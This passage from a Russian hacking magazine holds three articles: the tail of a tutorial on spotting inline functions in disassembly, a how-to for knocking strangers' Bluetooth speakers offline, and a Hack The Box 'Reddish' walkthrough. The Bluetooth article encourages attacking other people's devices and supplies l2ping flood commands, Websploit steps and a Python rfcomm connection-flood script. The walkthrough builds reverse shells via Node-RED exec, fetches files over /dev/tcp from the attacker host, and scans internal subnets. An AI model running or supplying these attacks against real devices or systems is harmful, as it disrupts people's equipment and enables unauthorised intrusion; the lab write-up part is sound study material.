условным переходом мы видим кучу ничего не напоминающих инструкций,
в логике работы которых еще предстоит разоб раться.
   Встроенные функции не имеют ни собственного пролога, ни эпилога, их
код и локальные переменные (если таковые имеются) полностью вживлены
в вызывающую функцию, результат компиляции выглядит в точности так,
как будто бы никакого вызова функции и не было. Единственная зацепка —
встраивание функции неизбежно приводит к дублированию ее кода во всех
местах вызова, а это хоть и с трудом, но можно обна ружить. С трудом потому,
что встраиваемая функция, ста новясь частью вызыва ющей функции, всквоз‐
ную оптимизируется в контексте последней, что приводит к значительным
вариациям кода.
   Рассмотрим сле дующий пример, чтобы увидеть, как компилятор опти‐
мизирует встраиваемую функцию (Listing7):


#include <stdio.h>


inline int max(int a, int b){
  if(a > b)
    return a;
  return b;
}


int main(int argc, char **argv){
  printf("%x\n",max(0x666,0x777));
  printf("%x\n",max(0x666,argc));
  printf("%x\n",max(0x666,argc));
  return 0;
}

Результат компиляции этого кода будет иметь следующий вид (функция main):


.text:00401000    push    ebp
.text:00401001    mov     ebp, esp
.text:00401003    push    777h              ; Подготавливаем два
.text:00401008    push    666h              ; аргумента функции
.text:0040100D    call    sub_401070        ; Вызов сравнивающей
функции max
.text:00401012    add     esp, 8
.text:00401015    push    eax
.text:00401016    push    offset unk_412160 ; Добавляем параметр %x
.text:0040101B    call    sub_4010D0        ; Вызов printf
.text:00401020    add     esp, 8
.text:00401023    mov     eax, [ebp+arg_0]  ; Берем аргумент argc —
количество аргументов
.text:00401026    push    eax
.text:00401027    push    666h              ; Запихиваем константу
.text:0040102C    call    sub_401070        ; Вызов функции max
.text:00401031    add     esp, 8
.text:00401034    push    eax
.text:00401035    push    offset unk_412164 ; Добавляем параметр ‘%x’
.text:0040103A    call    sub_4010D0        ; Вызов printf
.text:0040103F    add     esp, 8
.text:00401042    mov     ecx, [ebp+arg_0]  ; <‐‐
.text:00401045    push    ecx               ; <‐‐
.text:00401046    push    666h              ; <‐‐
.text:0040104B    call    sub_401070        ; <‐‐ Аналогичная
.text:00401050    add     esp, 8            ; <‐‐ последовательность
.text:00401053    push    eax               ; <‐‐ действий
.text:00401054    push    offset unk_412168 ; <‐‐
.text:00401059    call    sub_4010D0        ; <‐‐
.text:0040105E    add     esp, 8
.text:00401061    xor     eax, eax
.text:00401063    pop     ebp
.text:00401064    retn

«Так‐так», — шепчем себе под нос. И что же он тут накомпилировал? Встра‐
иваемую функцию представил в виде обычной! Вот дела! Компилятор забил
на наше желание сделать функцию встраиваемой (мы ведь написали
модификатор  inline).  Ситуацию  не  исправляет  даже  использование
параметров компилятора: /Od или /Oi. Первый служит для отключения опти‐
мизации, второй — для соз дания встраиваемых функций. Такими темпами
компилятор вскоре будет генерировать код, угодный собственным пред‐
почтениям или предпочтениям его разработчика, а не программиста, его
использующего! Остальное ты можешь увидеть в комментариях к дизассем‐
блированному листингу.
  Сравнивающая функция max в дизас семблированном виде будет выг‐
лядеть так:


.text:00401070    push    ebp
.text:00401071    mov     ebp, esp
.text:00401073    mov     eax, [ebp+arg_0]
.text:00401076    cmp     eax, [ebp+arg_4] ; Сравниваем и в
зависимости
.text:00401079    jle     short loc_401080 ; от результата —
переходим
.text:0040107B    mov     eax, [ebp+arg_0]
.text:0040107E    jmp     short loc_401083 ; Безусловный переход на
эпилог
.text:00401080 loc_401080:                 ; CODE XREF: sub_40
1070+9?j
.text:00401080    mov     eax, [ebp+arg_4]
.text:00401083 loc_401083:                 ; CODE XREF: sub_40
1070+E?j
.text:00401083    pop     ebp
.text:00401084    retn

Здесь тоже все важные фрагменты про комменти рованы.
  Напоследок предлагаю откомпилировать и рассмотреть следующий при‐
мер (Listing8). Он немного усложнен по сравнению с пре дыду щим, в нем
в качестве одного из зна чений для сравнения исполь зуется аргумент коман‐
дной строки, который преобра зуется из строки в число и при выводе обратно.


#include <iostream>
#include <sstream>
#include <string>
using namespace std;


inline string max(int a, int b){ // Встраиваемая функция нахождения
максимума
  int val = (a > b) ? a : b;
  stringstream stream;
  stream << "0x" << hex << val; // Преобразуем значение в hex‐число
  string res = stream.str();
  return res;
}


int main(int argc, char **argv){
  cout << max(0x666, 0x777) << endl;
  string par = argv[1];
  int val;
  if (par.substr(0, 2) == "0x") // Если впереди параметра есть
символы '0x',
    val = stoi(argv[1], nullptr, 16); // тогда это hex‐число,
  else
    val = stoi(argv[1], nullptr, 10); // в ином случае — dec‐число
  cout << max(0x666, val) << endl;
  cout << max(0x666, val) << endl;
  return 0;
}





                           VS Code

Сразу в начале своего выполнения программа вызывает встраиваемую фун‐
кцию, передавая ей два шес тнадцатеричных числа. В качестве результата
функция возвращает большее из них, преобразованное в шестнадцатерич‐
ный формат. После чего основная функция выводит его в консоль.
  Следующим действием программа берет параметр командной строки.
Она различает числа двух форматов: десятичные и шестнадцатеричные,
определяя их по отсутс твию или наличию префикса 0x. Два последующих
оператора идентичны, в них происходят вызовы функции max, которой оба
раза передаются одинаковые параметры: 0x666 и параметр командной стро‐
ки, преобразован ный из строки в число. Эти два последовательных операто‐
ра, как и в прош лый раз, поз волят нам проследить вызовы функции.





                    Вывод приложения

Вместе с дополнительной функциональностью соответственно увеличил ся
дизассемблерный листинг. Тем не менее суть происходящего не изменилась.
Чтобы не приводить его здесь (он занимает реально много мес та), пред‐
лагаю тебе разобраться с ним самос тоятельно.


Ито ги
Тема «Идентификация ключевых структур» очень важна, хотя бы потому, что
в современных языках программирования этих структур великое множество.
И в сегодняшней статье мы только начали рассмат ривать функции. Ведь, кро‐
ме приведенных выше функций (обычных, голых, встраиваемых) и способов
их вызова (непосредственный вызов, по ука зателю, с комплексным вычис‐
лением адреса), существу ют также виртуальные, биб лиотечные. Кроме того,
к функциям можно отнести конс трукторы и дес трукторы. Но не будем
забегать вперед.
  Прежде чем переходить к методам объектов, ста тическим и виртуальным
функциям, надо научиться идентифицировать стартовые функции, которые
могут занимать значительную часть дизас семблерного листинга, но анализи‐
ровать которые нет необ ходимос ти (за неболь шими исключениями). Поэто‐
му, дорогой друг, напиши в комментах к статье, что ты думаешь о теме иден‐
тификации и какие конс трукции тебе интерес ны для анализа.


        WWW

                   •Материалы к статье
ВЗЛОМ


                   РАЗБИРАЕМ ТРЮК,
                 КОТОРЫЙ ПОМОЖЕТ
                       ОТКЛЮЧИТЬ
                   ЧУЖУЮ КОЛОНКУ





                                                                                   Ghoustchat
                                                                                    aio02012003@gmail.com
    DOS
 НА BLUETOOTH




На свете сущес твует не так много вещей, которые бесят
прак тичес ки всех без исключения. Это весен не‐осенняя сля‐
коть,  летнее  отключение  горячей  воды  и  школь ники
с переносными Bluetooth‐колонками. И если с первыми дву‐
мя стихийными бедствиями сделать практически ничего
нельзя, то с третьим вполне можно бороться, причем почти
без криминала. Как? Об этом и поговорим.


Если сов ременные Wi‐Fi‐роутеры способны филь тровать нежелательные
пакеты, то большинство адап теров Bluetooth, мягко говоря, туповаты. Им
по большому счету безразлично, какой пакет и какого объ ема, а уж тем более
сколько этих пакетов ты пришлешь. Поэтому нам не сос тавля ет абсолютно
никакого  труда увеличить в  Linux информа ционный объ ем пакета  ping
до огромного значения, а потом отос лать этих пакетов на девайс с Bluetooth,
скажем, 1000 штук.
   Теперь по порядку. Для начала нам нужно найти подходящие устройства
в зоне досягаемости. Для этого используем команду


$ hcitool scan

В результате этой нехитрой манипуляции ты получишь список доступных
устройств с Bluetooth с их MAC‐адресами. Если твоя система не видит адап‐
тер Bluetooth, то я рекомендую поставить один из менеджеров Bluetooth
для Linux. В Kali лично мне подошел gnome‐bluetooth, который можно уста‐
новить следующей командой:


$ apt‐get install gnome‐bluetooth

Еще можно воспользоваться утилитой blueman:


$ apt‐get install blueman

Получив список потенциальных жертв, можно рас правиться с их синезубыми
девайсами несколькими способами. Рассмотрим каж дый по отдельнос ти.


ПЕРВЫЙ СПОСОБ: L2PING
Воспользуемся такой командой:


$ l2ping ‐i hci0 ‐s <packet value> ‐f <MAC_address>

Она сгенерирует пакеты указанного тобой в парамет ре <packet value> объ‐
ема и будет отсылать эти пакеты на MAC‐адрес, записанный в качестве
параметра <MAC_address>. В конце концов ты увидишь такую картину: в тер‐
минале время отклика будет пос тепенно увеличиваться, а на атакуемом
устройстве, скорее всего, прос то отключится Bluetooth. Через какое‐то время
он все равно вклю чится, но музыка прервется, и некоторое удовлетворение
будет получено.


             INFO

                       Такая схема очень хорошо работает, когда ата‐
                      куемое устройство (к примеру, телефон) подклю‐
                       чено к гарнитуре или колон ке по Bluetooth. После
                         атаки эти два устройства не смо гут соединиться
                        друг с другом.



ВТОРОЙ СПОСОБ: WEBSPLOIT
Существует  более  элегантный  и  удобный  способ  заглушить  колонку,
из которой доносятся жизнерадостные  зву ки  рэпа. Запускаем  утилиту
Websploit:


$ websploit

Набираем в консоли команду


$ show modules

Она продемонстрирует нам все модули, которые работают с этой утилитой.
Там есть множество компонентов, работающих с Wi‐Fi, но нас интересует
конкретно модуль bluetooth/bluetooth_pod:


$ use bluetooth/bluetooth_pod

Теперь нужно настроить все параметры и указать све дения об атакуемом
устройстве:


$ show options
$ set bdaddr <MAC_address>

Чтобы точно и наверняка угробить Bluetooth, мы изменим размер отсылаемо‐
го пакета:


$ set size 999

Все подготовительные действия завершены, можем запус кать нашу «машину
для убийств»:


$ run

На выходе мы увидим абсо лютно похожую картину: пинги становятся дольше,
а музыка пре рывается. Красота!
   Эти два способа будут работать практически с любыми блютус ными
колонками, гарнитурами и прочими похожими устройствами. Просто потому,
что производите ли не выпускают для них новые прошивки, способные филь‐
тровать входящие пакеты. Так что, если у тебя есть ноутбук с «Линуксом»
на борту, ты точно можешь наз вать себя грозой портативных колонок.
   Если колонка справляет ся с атакой, можно поп робовать отправить пакеты
на сам телефон, к которому она подклю чена. Лично я тес тировал этот метод
на довольно мощной портативной колонке (JBL Xtreme), и она более‐менее
справлялась с нагрузкой. Но дешевые китайские поделки такая атака выруба‐
ет на раз.


ПРО ГОТОВЫЕ ДЖАММЕРЫ
В интерне те продаются любопытные товары, среди которых можно найти
и глушилки частот. Стоят они обычно приличных денег и пре доставляют раз‐
ные возможности. Одни могут валить практически все сигналы мобильной
сети, Wi‐Fi и Bluetooth разом, а другие не спра вятся и с H+.
   Если ты считаешь, что тебе действительно необ ходим подобный товар, то
перед его приобретением настоятельно рекомендую ознакомиться с дей‐
ствующим законодатель ством. В Рос сии покупать и продавать глушилки
не запрещено, однако если ты решишь восполь зоваться ей, то необходима
регистрация устрой ства в ГКРЧ. Если тебя поймают на использовании
незарегистрированного   девайса,    то,   ско рее   всего,   оштрафуют
по статье 13.4 КоАП РФ. Штраф для физических лиц на сегод няшний день
составляет 500 рублей, для юридичес ких — до 10 тысяч.


ПОДКЛЮЧАЕМСЯ К ЧУЖОМУ ДЕВАЙСУ
Как мы уже знаем, примитивные колонки и гарнитуры почти никогда не филь‐
труют пакеты, которые мы им отправляем. Но что будет, если отос лать такому
девайсу не просто пакет с данными для про верки свя зи (ping), а пакет с зап‐
росом на подключение к устройству? И не один.
  Не  все производители подобных  гарнитур позаботились о защите
от переполнения буфера. Если все пакеты становят ся в оче редь, то что про‐
изойдет, когда складировать запросы уже будет некуда? Колонка попытается
выпол нить команду и при этом очистить буфер.
  Поэтому мы используем стандартный про токол обмена данными по Вlue‐
tooth — rfcomm. Но так как сама утилита, контролиру ющая протокол, не поз‐
волит нам отправить тысячу таких запросов, мы напишем небольшой скрипт
на Python, который автоматизиру ет процесс.


#!/usr/bin/env python
import subprocess


cmd=['rfcomm', 'connect', '<MAC_address>', '1']


for i in range(0, 1001):
    subprocess.call(cmd)
print('Connecting...')

Перед запуском скрипта нам нуж но узнать MAC‐адрес устройства. Для этого
используем уже знакомую команду hcitool scan, а полученный адрес встав‐
ляем в скрипт вместо <MAC_address>. Теперь сохраняем скрипт и запускаем
его:


$ python <FileName>

Сработает скрипт или нет, зависит от модели атакуемого девайса, вернее,
от скорости запол нения буфера. Если буфер успеет забиться до его очистки,
то команда будет выполнена, и тогда мы подклю чимся к колонке одновремен‐
но с основным поль зователем. Если же буфер очис тится,  то  ничего
не получится и придется перезапустить скрипт.
   Если наш сценарий успешно выполнен, мы можем устроить свою дис‐
котеку или вырубить устройство. Мои личные эксперименты с колонкой JBL
Xtreme привели к ее отклю чению, а вот JBL Flip 2 ког да‐то удавалось и перех‐
ватывать (сейчас ее под рукой нет).
  Думаю, всем читателям «Хакера» будет крайне интересно узнать о резуль‐
татах твоих опытов с разными девайсами. Обязательно поделись ими в ком‐
ментариях!
ВЗЛОМ


  ДЬЯВОЛЬСКИ-КРАСНЫЙ
ПЕНТЕСТ





     СТРОИМ ЦЕПОЧКИ ТУННЕЛЕЙ
       ЧЕРЕЗ ДОКЕР‐КОНТЕЙНЕРЫ
     НА ВИРТУАЛКЕ С HACK THE BOX





Что делать, когда тебе нужно захватить кон‐
троль над хостом, который находится в дру‐
гой подсети? Верно — много запутанных
туннелей! Сегодня мы рассмотрим техники                                                                                       snovvcrash
туннелирования при пентесте — на при‐        Безопасник,питонщик, временамиместами
мере хардкорной виртуалки Reddish (уро‐       необходимостикриптоана(рхист)литик,системныйпо
вень сложности Insane — 8 баллов из 10)        snovvcrash@protonmail.chадминистратор
с CTF‐площадки Hack The Box.


Встретимся со средой визуального прог рамми рования Node‐RED, где в пря‐
мом смысле построим реверс‐шелл; проэксплуатируем слабую конфигура‐
цию СУБД Redis; используем инс трумент зеркалирования файлов rsync
для доступа к чужой файловой системе; наконец, соз дадим кучу вредоносных
задач cron на любой вкус. Но самое интерес ное, что управлять хос том мы
будем, маршрутизируя трафик по докер‐контейнерам через несколько TCP‐
туннелей. Погнали!


РАЗВЕДКА
В этом разделе соберем побольше информации для проникновения вглубь
системы.


Сканиро вание портов
Расчехляем Nmap — и в бой! Сразу ска жу, что дефол тные 1000 портов,
которые Nmap сканирует в первую очередь, оказались закрыты. Так что
будем исследовать весь диапазон TCP на высокой скорос ти.



  root@kali:~# nmap ‐n ‐Pn ‐‐min‐rate=5000 ‐oA nmap/tcp‐allports
  10.10.10.94 ‐p‐
  root@kali:~# cat nmap/tcp‐allports.nmap
  ...
  Host is up (0.12s latency).
  Not shown: 65534 closed ports
  PORT     STATE SERVICE
  1880/tcp open  vsat‐control
  ...


После полного сканирования, как видишь, откликнулся только один порт —
неизвестный мне 1880‐й. Попробуем вытащить из него больше информации.



  root@kali:~# nmap ‐n ‐Pn ‐sV ‐sC ‐oA nmap/tcp‐port1880 10.10.10.94 ‐
  p1880
  root@kali:~# cat nmap/tcp‐port1880.nmap
  ...
  PORT     STATE SERVICE VERSION
  1880/tcp open  http    Node.js Express framework
  |_http‐title: Error
  ...


Сканер говорит, что на этом порте раз вернут Express — фреймворк веб‐при‐
ложений Node.js. А когда видишь приставку «веб» — в первую очередь откры‐
ваешь браузер…


Веб — порт 1880
Переход на страницу http://10.10.10.94:1880/ выдает лишь скупое сооб‐
щение об ошибке.





             Не найдена запрашиваемая стра ница (404)

Есть два пути разоб раться, что за приложение висит на этом порте.
 1. Сохранить значок веб‐сайта к себе на машину (обычно они живут по адре‐
   су /favicon.ico) и попытаться найти его с помощью Reverse Image
   Search.
 2. Спросить у поисковика, с чем обычно ассоциирован порт 1880.

Второй вариант более «казуальный», но столь же эффективный: уже на пер‐
вой ссылке по такому запросу мне открылась Исти на.





      Гуглим информацию о 1880‐м порте (источник — speedguide.net)


Node-RED
Если верить официальному сайту, Node‐RED — это среда для визуального
программирования, где можно строить связи между разными сущностями (от
локальных железок до API онлайн‐сервисов). Чаще всего, как я понял,
о Node‐RED говорят в контексте управления умными домами и вообще
девайсами IoT.


Окей, софт мы идентифицирова ли, но ошиб ка дос тупа к веб‐странице от это‐
го никуда не делась.



  root@kali:~# curl ‐i http://10.10.10.94:1880
  HTTP/1.1 404 Not Found
  X‐Powered‐By: Express
  Content‐Security‐Policy: default‐src 'self'
  X‐Content‐Type‐Options: nosniff
  Content‐Type: text/html; charset=utf‐8
  Content‐Length: 139
  Date: Thu, 30 Jan 2020 21:53:05 GMT
  Connection: keep‐alive


  <!DOCTYPE html>
  <html lang="en">
  <head>
  <meta charset="utf‐8">
  <title>Errortitle>
  head>
  <body>
  <pre>Cannot GET /pre>
  body>
  html>


Первое, что приходит в голову, — запустить бру тер директорий. Но перед
этим попробуем просто поменять зап рос с GET на POST.



  root@kali:~# curl ‐i ‐X POST http://10.10.10.94:1880
  HTTP/1.1 200 OK
  X‐Powered‐By: Express
  Content‐Type: application/json; charset=utf‐8
  Content‐Length: 86
  ETag: W/"56‐dJUoKg9C3oMp/xaXSpD6C8hvObg"
  Date: Thu, 30 Jan 2020 22:04:20 GMT
  Connection: keep‐alive


  {"id":"a237ac201a5e6c6aa198d974da3705b8","ip":"::ffff:10.10.14.19",
  "path":"/red/{id}"}


Ну вот и обошлись без бру теров. Как видишь, при обращении к корню
веб‐сайта через POST сервер возвращает пример того, как должно выглядеть
тело запроса. В принципе, до это го мож но дойти логичес ки: в документации
к API Node‐RED тонны именно POST-запросов.
   Итак,    при    переходе    по    http://10.10.10.94:1880/red/
a237ac201a5e6c6aa198d974da3705b8/ мы видим следующую картину.





                 Рабочая область среды Node‐RED

Давай разбираться, что здесь мож но наворотить.


Node-RED Flow
Первая ассоциация при виде рабочей области Node‐RED — «песочница».
И так видно, что эта шту ка способ на на многое, однако нам нужно всего
ничего: получить шелл на сервере.





                  Список узлов среды Node‐RED

Я пролистал вниз панель «строитель ных блоков» (или «узлов», как называет их
Node‐RED) слева и увидел вкладку Advanced — здесь спряталась дорогая
сердцу любого хакера функция exec.


Spice must FLOW
В  философии  Node‐RED  каждая  комбинация,  которую  ты  соберешь
в рабочей области, называется «флоу» (он же поток). Потоки можно строить,
выпол нять, импортировать и экспортировать в JSON. При нажатии на кнопку
Deploy сервер (как ни странно) деплоит все потоки со всех вкладок рабочей
области.



simple-shell
Попробуем что‐нибудь пос троить, тогда все станет очевид ней. Для начала я
задеплоил тривиальный шелл.





              Флоу с тривиальным шеллом (simple‐shell)

Разберем картинку по цветам блоков:
 • Серый (сле ва): получение данных на вход. Сервер выполняет обратное
   подклю чение к моему IP и привязывает ввод с моей клавиатуры к оран‐
   жевому блоку exec.
 • Оранжевый: выполнение команд на сервере. Результат работы этого бло‐
   ка поступает на вход второму серому блоку. Обрати внимание: у оран‐
   жевого блока есть три выходных «клеммы». Они соответству ют stdout,
  stderr и коду возвра та (который я не стал использовать).
 • Серый (справа): отправка выходных данных. Открыв расширенные нас‐
   тройки блока двой ным кликом, можно задать особенности его поведе ния.
  Я выбрал Reply to TCP, чтобы Node‐RED отправлял мне ответы в этом же
   подклю чении.

О двух серых блоках можно думать как о сетевых пайпах, по которым идет IN‐
PUT и OUTPUT блока exec. Экспортированный в JSON поток я оставлю у себя
на GitHub, чтобы не засорять тело статьи.
   Теперь поднимем локального слушателя на Kali и устроим деплой!





             Отклик на машине ата кующего от simple‐shell

Как можно видеть — обыкновенный шелл non‐PTY.


beautiful-shell
Конечно, мне было интересно поиграть в такой песочнице, поэтому я собрал
еще несколько конструкций.





             Флоу с улучшенным шеллом (beautiful‐shell)

Это более аккуратный шелл: с ним можно отправлять запрос на под ключение
«с кнопки» без необ ходимости редеп лоить весь про ект (синий), логировать
происходящее в веб‐интерфейс (зеленый, результат смотри на рисунке
ниже) и форматировать вывод команд под свой шаблон (жел тый).





            Отклик на машине ата кующего от beautiful‐shell





        Пример информационных сооб щений в диалоге отладки


        WWW

                    •Исходник в JSON




file-upload
Раз такое дело, почему бы не соору дить флоу для заливки файлов на сервер?





           Флоу c отправкой файлов на сервер (ﬁle‐upload)

Здесь все совсем просто: по нажатию на кноп ку Connect сервер под ключает‐
ся к порту 8889 моей машины (где уже поднят листенер с нужным файлом)
и сохраняет полученную информацию в скрытый файл /tmp/.file (JSON).
  Испытаем этот поток в деле: я запускаю nc на Kali, велю передать скрипт
lse.sh для проведения локальной раз ведки на Linux (я начал его использовать
вместо привычного LinEnum.sh), дожида юсь окон чания загрузки и проверяю
контрольные суммы обеих копий.
  На Kali:



  root@kali:~# nc ‐lvnp 8889 < lse.sh
  ...
  root@kali:~# md5sum lse.sh
  7d3a4fe5c7f91692885bbeb631f57c70  lse.sh





             Отправка скрипта lse.sh на сервер Node‐RED

На Node‐RED:



  root@nodered:/tmp# md5sum .file
  7d3a4fe5c7f91692885bbeb631f57c70  .file


Заг рузка фай лов из коман дной стро ки
Откровенно говоря, описанный подход к трансферу фай лов избыточен: весь
процесс можно провести, не отходя от терминала.


 root@kali:~# nc ‐w3 ‐lvnp 8889 < lse.sh
 root@nodered:~# bash ‐c 'cat < /dev/tcp/10.10.14.19/8889 > /tmp/.
 file'





reverse-shell
Я не был доволен шеллом, построенным из абс тракций Node‐RED (некоррек‐
тно читались некото рые символы, да и вся конс трукция выглядела очень
ненадежно), поэтому я получил полноценный Reverse Shell.





  Отправка реверс‐шелла из открытой сес сии Node‐RED на машину ата‐
  кующего

Сперва я сделал, как показано выше: открыл еще один порт в новой вкладке
терминала и вызвал реверс‐шелл на Bash по TCP. Но потом я решил
упростить себе жизнь на случай, если придется перезапускать сессию, и соб‐
рал такой флоу в Node‐RED (JSON).





                Флоу c реверс‐шел лом (reverse‐shell)


             INFO

                   Обрати  внимание,  что  я  завернул  пейлоад
                       для реверс‐шелла в дополнительную оболочку
                        Bash: bash  ‐c  '<PAYLOAD>'. Это сделано
                       для того, что бы коман ду выполнил именно интер‐
                      претатор Bash, так как дефолтный шелл на этом
                        хосте — dash.

                     node‐red> ls ‐la /bin/sh
                     lrwxrwxrwx 1 root root 4 Nov  8
                     2014 /bin/sh ‐> dash


Теперь я могу написать простой Bash‐скрипт, что бы триггерить callback
в один клик из командной стро ки.


#!/usr/bin/env bash


(sleep 0.5; curl ‐s ‐X POST http://10.10.10.94:1880/red/a237ac
201a5e6c6aa198d974da3705b8/inject/7635e880.e6be48 >/dev/null &)
rlwrap nc ‐lvnp 8888

Адрес URL, который я передаю curl, — это адрес объ екта Inject из нашего
потока (то есть кнопка Go! на рисунке выше). Также я использую rlwrap — ина‐
че невозможно перемещать ся стрелками влево‐вправо по вводимой строке
и вверх‐вниз по истории команд.
   У нас есть шелл — самое время разобраться, куда мы попали.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       ДЬЯВОЛЬСКИ-
   КРАСНЫЙ ПЕНТЕСТ
         СТРОИМ ЦЕПОЧКИ ТУННЕЛЕЙ ЧЕРЕЗ ДОКЕР‐
         КОНТЕЙНЕРЫ НА ВИРТУАЛКЕ С HACK THE BOX





ДОКЕР. КОНТЕЙНЕР I: NODERED
Уже с первых секунд пребывания на сервере становится очевидно, что мы
внутри докера, — ведь наш шелл вернулся от имени суперпользователя root.
   Это же предположение подтверждает  скрипт lse.sh, заброшенный
на машину в прошлом подразделе.





                      Часть вывода скрипта lse.sh

А если ты не веришь и ему, можно убедиться в этом лично: в корне файловой
системы (далее ФС) сущес твует директория .dockerenv.



  root@nodered:/node‐red# ls ‐la /.dockerenv
  ‐rwxr‐xr‐x 1 root root 0 May  4  2018 /.dockerenv


Если ты оказался в докере, первым делом рекомендуется проверить сетевое
окружение — на случай, если это не единичный контейнер в цепочке.
В текущей системе отсутс твует ifconfig, поэтому информацию о сетевых
интерфейсах будем смотреть с помощью ip addr.





        Смот рим информацию о сетевых интерфей сах в nodered

Как видно, этот докер может общаться с дву мя подсетями: 172.18.0.0/16
и 172.19.0.0/16. В первой подсети кон тейнер (будем называть его nodered)
имеет IP‐адрес 172.18.0.2, а во второй — 172.19.0.4. Пос мотрим, с какими
еще хостами взаимо действовал nodered.





                   Смот рим кеш ARP в nodered

Кеш ARP указывает на то, что nodered зна ет еще как минимум два хоста: 172.
19.0.2 и 172.19.0.3 (хосты .1 не беру во внимание: скорее всего, это шлю‐
зы по умолчанию к хостовой ОС).
  Проведем сканирование с целью об наруже ния хостов.


Host Discovery
«Пробить» сетевое окру жение можно раз ными способами.


Ping Sweep
Первый способ — написать простой скрипт, который позволит «простучать»
всех участников сети техникой Ping Sweep. Идея проста: на каждый хост уров‐
ня L2 в сети 172.18.0.0 (или прос то 172.18.0.0/24) отправим по одному
ICMP‐запросу и посмотрим на код возврата. Если успех — выводим сооб‐
щение на экран, иначе — ничего не дела ем.


#!/usr/bin/env bash


IP="$1"; for i in $(seq 1 254); do (ping ‐c1 $IP.$i >/dev/null &&
echo "ON: $IP.$i" &); done

В сканируемом участке сети всего может быть 254 хоста  (256 минус
адрес_сети минус адрес_широковещателя). Чтобы выпол нить эту проверку
за 1 секунду, а не за 254, запус каем каждый ping в своем шелл‐процессе.
Это не затратно, так как они будут быс тро умирать, а я получу практичес ки
мгновенный результат.



  root@nodered:~# IP="172.18.0"; for i in $(seq 1 254); do (ping ‐c1
  $IP.$i >/dev/null && echo "ON: $IP.$i" &); done
  ON: 172.18.0.1  <‐‐ Шлюз по умолчанию для nodered (хост)
  ON: 172.18.0.2  <‐‐ Докер‐контейнер nodered


При сканировании этой подсетки получили только гейтвей и свой же контей‐
нер. Неинтересно, пробуем 172.19.0.0/24.



  root@nodered:~# IP="172.19.0"; for i in $(seq 1 254); do (ping ‐c1
  $IP.$i >/dev/null && echo "ON: $IP.$i" &); done
  ON: 172.19.0.1  <‐‐ Шлюз по умолчанию для nodered (хост)
  ON: 172.19.0.2  <‐‐ ???
  ON: 172.19.0.3  <‐‐ ???
  ON: 172.19.0.4  <‐‐ Докер‐контейнер nodered


Есть два неизвестных  хоста, которые мы  вскоре отправимся  изучать.
Но прежде обсудим еще один способ проведения Host Discovery.


Статический Nmap
Забросим на nodered копию статически скомпилированного Nmap вместе
с файлом /etc/services (он содержит ассоциативный маппинг «имя_службы
↔ номер_порта», необходимый для работы ска нера) со своей Kali и запустим
обнаружение хостов.



  root@nodered:/tmp# ./nmap ‐n ‐sn 172.18.0.0/24 2>/dev/null | grep ‐e
  'scan report' ‐e 'scanned in'
  Nmap scan report for 172.18.0.1
  Nmap scan report for 172.18.0.2
  Nmap done: 256 IP addresses (2 hosts up) scanned in 2.01 seconds


Nmap нашел два хоста в подсети 172.18.0.0/24.



  root@nodered:/tmp# ./nmap ‐n ‐sn 172.19.0.0/24 2>/dev/null | grep ‐e
  'scan report' ‐e 'scanned in'
  Nmap scan report for 172.19.0.1
  Nmap scan report for 172.19.0.2
  Nmap scan report for 172.19.0.3
  Nmap scan report for 172.19.0.4
  Nmap done: 256 IP addresses (4 hosts up) scanned in 2.02 seconds


И четыре хоста в подсети 172.19.0.0/24. Всё в точности, как и при ручном
Ping Sweep.


Сканиро вание неиз вестных хостов
Чтобы выяснить, какие порты открыты на двух неиз вестных хостах, можно сно‐
ва написать такой однострочник на Bash.


#!/usr/bin/env bash


IP="$1"; for port in $(seq 1 65535); do (echo '.' >/dev/tcp/$IP/$port
 && echo "OPEN: $port" &) 2>/dev/null; done

Работать он будет примерно так же, как и ping‐sweep.sh, только вместо
команды ping здесь отправляется тес товый символ прямиком на сканиру‐
емый порт. Но зачем так извращать ся, когда у нас уже есть Nmap?



  root@nodered:/tmp# ./nmap ‐n ‐Pn ‐sT ‐‐min‐rate=5000 172.19.0.2 ‐p‐
  ...
  Unable to find nmap‐services!  Resorting to /etc/services
  Cannot find nmap‐payloads. UDP payloads are disabled.
  ...
  Host is up (0.00017s latency).
  Not shown: 65534 closed ports
  PORT     STATE SERVICE
  6379/tcp open  unknown
  ...


  root@nodered:/tmp# ./nmap ‐n ‐Pn ‐sT ‐‐min‐rate=5000 172.19.0.3 ‐p‐
  ...
  Unable to find nmap‐services!  Resorting to /etc/services
  Cannot find nmap‐payloads. UDP payloads are disabled.
  ...
  Host is up (0.00013s latency).
  Not shown: 65534 closed ports
  PORT   STATE SERVICE
  80/tcp open  http
  ...


Обнаружили два открытых порта — по одному на каждый неизвес тный хост.
Сперва подумаем, как можно доб рать ся до веба на 80‐м, а потом перейдем
к порту 6379.


ТУННЕЛИРОВАНИЕ... КАК МНОГО В ЭТОМ ЗВУКЕ
Чтобы добраться до удаленного 80‐го порта, при дется строить туннель
от своей машины до хос та 172.19.0.3. Сделать это можно поистине неис‐
числяемым количеством способов, например:
 • использовать функциональность Metasploit и пробросить маршрут через
   meterpreter‐сессию;
 • инициировать соединение Reverse SSH, где в качестве сервера будет
   выступать машина  ата кующего, а в качестве  клиента — контейнер
  nodered;
 • задействовать сторонние приложения, предназначенные для настройки
   туннелей между узлами.

Еще, наверное, можно воспользоваться песочницей Node‐RED и придумать
такой флоу, который осуществлял бы маршру тизацию трафика от атакующего
до неизвестных хостов, но… Хотел бы я посмотреть на смельчака, что этим
займется.
  Первый пункт с Metasploit мы рассматривали в предыдущей статье, поэто‐
му повторяться не будем. Второй пункт мы тоже затрагивали, но речь там шла
про тачки на Windows, а у нас же линуксы... Посему план такой: сперва я быс‐
тро покажу способ реверсивно го соединения с помощью SSH, а дальше
перейдем к специальному софту для туннелирования.


Reverse SSH (пример)
Для создания обратного SSH‐туннеля нужен переносной клиент — чтобы раз‐
местить его на nodered. Имен но таким клиентом является dropbear от австра‐
лийского разработчика Мэта Джонсона.
   Скачаем исходные коды с домашней страницы его создателя и ском‐
пилируем клиент статичес ки у себя на машине.



  root@kali:~# wget https://matt.ucc.asn.au/dropbear/dropbear‐
  2019.78.tar.bz2
  root@kali:~# tar xjvf dropbear‐2019.78.tar.bz2 && cd dropbear‐2019.78
  root@kali:~/dropbear‐2019.78# ./configure ‐‐enable‐static && make PRO‐
  GRAMS='dbclient dropbearkey'
  root@kali:~/dropbear‐2019.78# du ‐h dbclient
  1.4M    dbclient


Размер получен ного бинарника — 1,4 Мбайт. Мож но уменьшить его почти
в три раза двумя простыми командами.



  root@kali:~/dropbear‐2019.78# make strip
  root@kali:~/dropbear‐2019.78# upx dbclient
